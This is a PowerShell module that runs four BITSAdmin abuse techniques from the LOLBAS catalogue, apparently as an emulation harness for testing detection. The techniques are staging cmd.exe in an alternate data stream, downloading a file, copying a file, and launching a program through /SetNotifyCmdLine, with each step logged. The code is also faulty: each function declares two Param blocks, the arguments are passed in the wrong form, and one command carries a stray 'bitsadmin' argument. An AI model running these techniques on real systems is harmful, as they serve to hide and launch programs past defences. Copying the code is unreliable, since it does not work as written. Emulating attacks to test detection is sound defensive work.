<# 
    .Synopsis
    BITSAdmin abuse techniques

    .Description
    https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
#>

function Write-Log {
    Param(
    [Parameter(Mandatory=$True)]
    [string] $Message
    )

    # Log file location
    $logfile = $PSScriptRoot + "\logs\bitsadmin.log"

    $Stamp = (Get-Date).toString("yyyy/MM/dd HH:mm:ss")
    $Line = "$Stamp $Message"
    Add-Content $logfile -Value $Line
}

function Start-TechniqueOne {
    Param (
        [Parameter(Mandatory=$true, Position=0)]
        [String] $lolbinpath
    )

    Param (
        [Parameter(Mandatory=$true, Position=0)]
        [String] $tempdir
    )

    $logged_content = ""

    Write-Log("Technique 1 - Alternate Data Stream")

    # file staging - used invoke-cimmethod because nothing else worked... something to do with the colon
    $command = "cmd /c type c:\windows\system32\cmd.exe > $tempdir\1.txt:cmd.exe"
    Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $command}

    # actual technique
    $logged_content += & $lolbinpath /create t1 2>&1
    $logged_content += & $lolbinpath /addfile t1 c:\windows\system32\cmd.exe $tempdir\cmd.exe 2>&1
    $logged_content += & $lolbinpath /SetNotifyCmdLine t1 $tempdir\1.txt:cmd.exe NULL 2>&1
    $logged_content += & $lolbinpath /RESUME t1 2>&1
    $logged_content += & $lolbinpath /complete t1 2>&1

    Write-Log($logged_content)

    # clean up - this should be a seperate function
    Remove-Item -Path $tempdir\*
}

function Start-TechniqueTwo {
    Param (
        [Parameter(Mandatory=$true, Position=0)]
        [String] $lolbinpath
    )

    Param (
        [Parameter(Mandatory=$true, Position=0)]
        [String] $tempdir
    )

    $logged_content = ""
    
    Write-Log("Technique 2 - Download")

    $logged_content += & $lolbinpath /create t2 2>&1
    $logged_content += & $lolbinpath /addfile t2 https://live.sysinternals.com/autoruns.exe $tempdir\autoruns.exe 2>&1
    $logged_content += & $lolbinpath /resume t2 2>&1
    $logged_content += & $lolbinpath /complete t2 2>&1

    Write-Log($logged_content)

    # clean up
    Remove-Item -Path $tempdir\*
}

function Start-TechniqueThree {
    Param (
        [Parameter(Mandatory=$true, Position=0)]
        [String] $lolbinpath
    )

    Param (
        [Parameter(Mandatory=$true, Position=0)]
        [String] $tempdir
    )

    $logged_content = ""

    Write-Log("Technique 3 - Copy")

    $logged_content += & $lolbinpath /create t3 2>&1
    $logged_content += & $lolbinpath /addfile t3 c:\windows\system32\cmd.exe $tempdir\cmd.exe 2>&1
    $logged_content += & $lolbinpath /RESUME t3 2>&1
    $logged_content += & $lolbinpath /Complete t3 2>&1
    $logged_content += & $lolbinpath /reset 2>&1

    Write-Log($logged_content)

    # clean up - this should be a seperate function
    Remove-Item -Path $tempdir\*
}

function Start-TechniqueFour {
    Param (
        [Parameter(Mandatory=$true, Position=0)]
        [String] $lolbinpath
    )

    Param (
        [Parameter(Mandatory=$true, Position=0)]
        [String] $tempdir
    )

    $logged_content = ""

    Write-Log("Technique 4 - Execute")

    $logged_content += & $lolbinpath bitsadmin /create t4 2>&1 
    $logged_content += & $lolbinpath /addfile t4 c:\windows\system32\cmd.exe $tempdir\cmd.exe 2>&1
    $logged_content += & $lolbinpath /SetNotifyCmdLine t4 $tempdir\cmd.exe NULL 2>&1 
    $logged_content += & $lolbinpath /RESUME t4 2>&1
    $logged_content += & $lolbinpath /Reset 2>&1

    Write-Log($logged_content)

    # clean up - this should be a seperate function
    Remove-Item -Path $tempdir\*
}

function Start-Bits {

    # Create temp folder
    $tempdir = $PSScriptRoot + "\temp"
    if (-not (Test-Path $tempdir)) {
        New-Item -Path $tempdir -ItemType Directory
    }

    # Target binaries
    if (Test-Path 'c:\windows\system32\bitsadmin.exe') {
        $lolbinpath = 'C:\Windows\System32\bitsadmin.exe'
    }
    else {
        return
    }

    # Run all techniques
    Start-TechniqueOne($lolbinpath, $tempdir)
    Start-TechniqueTwo($lolbinpath, $tempdir)
    Start-TechniqueThree($lolbinpath, $tempdir)
    Start-TechniqueFour($lolbinpath, $tempdir)

    # Clean up
    Remove-Item -Path $tempdir -Recurse
}
Export-ModuleMember -Function Start-Bits